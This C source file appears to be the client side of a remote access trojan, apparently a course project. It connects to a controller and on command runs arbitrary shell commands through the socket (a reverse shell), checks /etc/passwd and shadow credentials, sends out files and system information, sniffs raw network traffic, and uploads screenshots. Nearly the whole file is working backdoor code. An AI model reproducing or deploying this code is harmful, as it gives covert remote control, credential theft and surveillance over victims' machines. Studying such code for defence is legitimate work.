#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include "traffic_monitor.h"
#include "credentials_utils.h"
#include "system_info_utils.h"
#include "system_monitor.h"
#include <fcntl.h>
#include <sys/stat.h>
#define PORT 8080
#define MAXLINE 1024

int sockfd;

void exec_commmand()
{
    char recv_command[MAXLINE];
    int command_len;
    command_len = read(sockfd, recv_command, MAXLINE);

    if (command_len <= 0) return;

    int new_stdin=dup(0);
    int new_stdout=dup(1);
    int new_stderr=dup(2);

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    system(recv_command);

    dup2(new_stdin,0);
    dup2(new_stdout,1);
    dup2(new_stderr,2);
}

void send_file()
{
    myWrite("Receiving filename", 1);
    struct file_struct file_to_send;

    read(sockfd, &file_to_send, sizeof(file_to_send));
    // add verificare ca exista fisierul
    printf("Name length: %d\n", file_to_send.name_length);
    printf("Name:%s", file_to_send.file_name);
    printf("Bytes received: %d\n", file_to_send.file_size);

    file_to_send.file_name[file_to_send.name_length] = 0;

    char fname[100];
    strncpy(fname, file_to_send.file_name, file_to_send.name_length);

    fname[file_to_send.name_length] = NULL;

    int len = strlen(fname);

    int fd = open(fname, O_RDONLY);

    char buffer[100];
    file_to_send.file_size = read(fd, buffer, 100);

    strncpy(file_to_send.file_bytes, buffer, file_to_send.file_size);

    write(sockfd, &file_to_send, sizeof(file_to_send));
}

void screenshot_system(int sockfd)
{
    system("gnome-screenshot -f /tmp/screenshot.png");
    //system("convert /tmp/screenshot.png -resize 700 /tmp/screenshot.png");

    //sleep(3);

    struct stat st;
    if (stat("/tmp/screenshot.png", &st) == -1) {
        const char *error_msg = "Failed to create screenshot\n<END_OF_DATA>";
        send(sockfd, error_msg, strlen(error_msg), 0);
        return;
    }

    int fd = open("/tmp/screenshot.png", O_RDONLY);
    if (fd == -1) {
        const char *error_msg = "Failed to open screenshot\n<END_OF_DATA>";
        send(sockfd, error_msg, strlen(error_msg), 0);
        return;
    }

    FILE *picture=fdopen(fd,"rb");

    char Sbuf[1024];
    int siz=1024;
    int n;

    unsigned int pic_size=0;
    fseek(picture,0,SEEK_END);
    pic_size=ftell(picture);
    printf("pic size:%d\n",pic_size);
    fseek(picture,0,SEEK_SET);
    unsigned int tmp=htonl(pic_size);

    send(sockfd,&tmp,sizeof(int),0);

    int bytes_sent=0;

    while(bytes_sent<pic_size){
    n = fread(Sbuf, sizeof(char), siz, picture);
    bytes_sent+=n;
    if (n > 0) { 
        if((n = send(sockfd, Sbuf, n, 0)) < 0) 
        {
            perror("send_data()");
            exit(errno);
        }

    }
    printf("I sent %d\n",bytes_sent);
}

    // char *buffer=(char*)malloc(MAXLINE*1000);

    // struct file_struct file_to_send;
    // strcpy(file_to_send.file_name,"screenshot.png");
    // file_to_send.name_length=strlen(file_to_send.file_name);

    // char file_content_buff[MAXLINE*1000];
    // file_to_send.file_size = read(fd, file_to_send.file_bytes, MAXLINE*1000);

    // int sent_bytes=send(sockfd, &file_to_send, sizeof(file_to_send),0);

    // printf("sending %d\n",sent_bytes);
    
}

void capturetraffic()
{
    if (getuid() == 1000) {
        myWrite("No root on client, cannot capture traffic.", sockfd);
        send(sockfd, "<END_OF_DATA>", strlen("<END_OF_DATA>"), 0);
        return;
    }

    int fd_log = open("traffic_log.txt", O_CREAT | O_RDWR);

    int saddr_size, data_size;
    struct sockaddr saddr;
    struct in_addr in;

    char buffer[MAXLINE * 20];

    int sock_raw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    int nr_packets = 0;
    while (nr_packets <= 1000) {
        saddr_size = sizeof(saddr);
        data_size = recvfrom(sock_raw, buffer, MAXLINE * 20, 0, &saddr, &saddr_size);
        if (data_size < 0) {
            myWrite("Error handling packets", STDOUT_FILENO);
        } else {
            processPackets(buffer, data_size, sockfd);
        }
        nr_packets++;
    }
    send(sockfd, "<END_OF_DATA>", strlen("<END_OF_DATA>"), 0);

    // TODO: socket error handling
}

int main()
{
    char buffer[MAXLINE];
    struct sockaddr_in servaddr;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    setvbuf(stdout, 0, _IONBF, 0);

    memset(&servaddr, 0, sizeof(servaddr));

    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(PORT);
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    int n, len;

    int val_conn;
    val_conn = connect(sockfd, (const struct sockaddr*)&servaddr, sizeof(servaddr));
    if (val_conn != 0) {
        perror("connection failed");
        exit(EXIT_FAILURE);
    }
    while (1) {
        myWrite("Receiving option", STDOUT_FILENO);
        char opt;
        int bytesRead = 0;
        while (bytesRead != 1) {
            bytesRead = read(sockfd, &opt, 1);
        }
        myWrite("Received option", STDOUT_FILENO);
        switch (opt) {
            case '1':
                exec_commmand();
                break;
            case '2':
                etc_passwd_shadow_checker(sockfd);
                break;
            case '3':
                collect_system_info(sockfd);
                break;
            case '4':
                send_file();
                break;
            case '5':
                capturetraffic();
                break;
            case '6':
                monitor_system(sockfd);
                break;
            case '7':
                screenshot_system(sockfd);
                break;
            default:
                break;
        }
    }

    close(sockfd);
    return 0;
}